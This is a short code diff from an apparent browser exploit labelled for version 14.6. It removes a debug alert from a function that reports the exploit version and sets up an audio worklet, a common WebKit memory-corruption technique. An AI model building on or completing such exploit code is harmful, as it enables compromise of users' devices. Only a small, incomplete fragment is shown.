@@ -7,7 +7,6 @@ async function kickstart146() {
 		exploitVersion: "14.6",
 		userAgent: navigator.userAgent,
 	});
-  alert("exploit started");
 	var context = new OfflineAudioContext(1, 128, 300000);
 	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
       // constant added to double JSValues
